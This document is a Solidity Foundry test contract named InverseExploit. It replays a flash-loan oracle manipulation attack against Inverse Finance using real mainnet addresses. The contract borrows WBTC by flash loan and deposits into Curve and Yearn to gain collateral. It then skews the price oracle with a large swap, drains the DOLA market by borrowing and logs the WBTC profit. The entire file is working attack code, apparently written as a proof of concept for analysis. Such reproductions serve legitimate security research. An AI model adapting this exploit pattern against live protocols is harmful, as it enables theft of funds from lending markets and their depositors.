pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "./FlashLoanReceiverBase.sol";
import "./interfaces/ICurve.sol";
import "./interfaces/Utils.sol";

contract InverseExploit is
    FlashLoanReceiverBase(
        ILendingPoolAddressesProvider(
            0xB53C1a33016B2DC2fF3653530bfF1848a515c8c5
        )
    ),
    Test
{
    address WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address DOLA = 0x865377367054516e17014CcdED1e7d814EDC9ce4;
    address THREE_CRV = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address curve3pool = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address threeCrypto = 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46;
    address crv3crypto = 0xc4AD29ba4B3c580e6D59105FFf484999997675Ff;
    address vyCurve_3Crypto = 0xE537B5cc158EB71037D4125BDD7538421981E6AA;
    address vyCrv3CryptoInverse = 0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587; // inverse.Fi
    address unitroller = 0x4dCf7407AE5C07f8681e1659f626E114A7667339;
    address priceFeed = 0xE8b3bC58774857732C6C1147BFc9B9e5Fb6F427C;
    address curveRegistry = 0x8e764bE4288B842791989DB5b8ec067279829809;
    address anchorDola = 0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670;
    address dola3pool3crv_f = 0xAA5A67c256e27A5d80712c51971408db3370927D;

    uint256 WBTC_AMOUNT = 27000 * 1e8;

    function exploit() external {
        address[] memory assets = new address[](1);
        assets[0] = WBTC;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = WBTC_AMOUNT;

        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        bytes memory params = "";

        ILendingPool(LENDING_POOL).flashLoan(
            address(this),
            assets,
            amounts,
            modes,
            address(this),
            params,
            0
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        
        uint256 amountOwed = amounts[0] + premiums[0];
        console.log("Flashloan amount + premium owed",amountOwed);

        IERC20(WBTC).approve(address(LENDING_POOL), amounts[0] + premiums[0]);

        IERC20(WBTC).approve(threeCrypto, type(uint256).max);
        IERC20(WBTC).approve(curveRegistry, type(uint256).max);

        IUSDT(USDT).approve(threeCrypto, type(uint256).max);
        IUSDT(USDT).approve(curveRegistry, type(uint256).max);

        IERC20(DOLA).approve(dola3pool3crv_f, type(uint256).max);
        IERC20(DOLA).approve(curveRegistry, type(uint256).max);

        IERC20(crv3crypto).approve(vyCurve_3Crypto, type(uint256).max);
        IERC20(vyCurve_3Crypto).approve(vyCrv3CryptoInverse, type(uint256).max);

        ICurve(threeCrypto).add_liquidity([0, uint256(22500000000), 0], 0);

        uint256 lp_crv3crypto = IERC20(crv3crypto).balanceOf(address(this));
        console.log("Deposited 225 WBTC & Received 3crypto", lp_crv3crypto);

        IYearnVault(vyCurve_3Crypto).deposit(lp_crv3crypto, address(this));

        uint256 lp_vycrv3crypto = IERC20(vyCurve_3Crypto).balanceOf(
            address(this)
        );
        console.log(
            "Deposited 5375596969399930881565 crv3crypto & Received yvCrv-3crypto",
            lp_vycrv3crypto
        );

        InverseFinanace(vyCrv3CryptoInverse).mint(lp_vycrv3crypto);
        console.log("Deposited 4906754677503974414310 yvCrv-3crypto");

        address[] memory market = new address[](1);
        market[0] = vyCrv3CryptoInverse;
        IUnitroller(unitroller).enterMarkets(market);

        uint256 lastestAnswer = IYearnVaultFeed(priceFeed).latestAnswer();
        console.log("Oracle price before", lastestAnswer);

        ICurve(curveRegistry).exchange(
            threeCrypto,
            WBTC,
            USDT,
            IERC20(WBTC).balanceOf(address(this)),
            0,
            address(this)
        );

        console.log("Received USDT", IERC20(USDT).balanceOf(address(this)));

        lastestAnswer = IYearnVaultFeed(priceFeed).latestAnswer();
        console.log("Oracle price after", lastestAnswer);

        IUnitroller(anchorDola).borrow(IERC20(DOLA).balanceOf(anchorDola));

        uint256 borrowedDola = IERC20(DOLA).balanceOf(address(this));
        console.log("Amount of borrowed DOLA", borrowedDola);

        ICurve(curveRegistry).exchange(
            threeCrypto,
            USDT,
            WBTC,
            IERC20(USDT).balanceOf(address(this)),
            0,
            address(this)
        );

        console.log("WBTC after swap", IERC20(WBTC).balanceOf(address(this)));

        ICurve(curveRegistry).exchange(
            dola3pool3crv_f,
            DOLA,
            THREE_CRV,
            borrowedDola,
            0,
            address(this)
        );

        uint256 lp_3crv = IERC20(THREE_CRV).balanceOf(address(this));

        console.log("3crv balance of contract", lp_3crv);

        ICurve(curve3pool).remove_liquidity_one_coin(lp_3crv, 2, 0);

        uint256 usdtAfterRemovingLiquidity = IERC20(USDT).balanceOf(
            address(this)
        );
        console.log(
            "USDT after removing 3CRV liquidity",
            usdtAfterRemovingLiquidity
        );

        ICurve(curveRegistry).exchange(
            threeCrypto,
            USDT,
            WBTC,
            usdtAfterRemovingLiquidity,
            0,
            address(this)
        );

        uint256 totalBtc = IERC20(WBTC).balanceOf(address(this));
        console.log("Total BTC ", totalBtc);
        console.log("Profit in WBTC ", totalBtc - amountOwed);

        return true;
    }
}
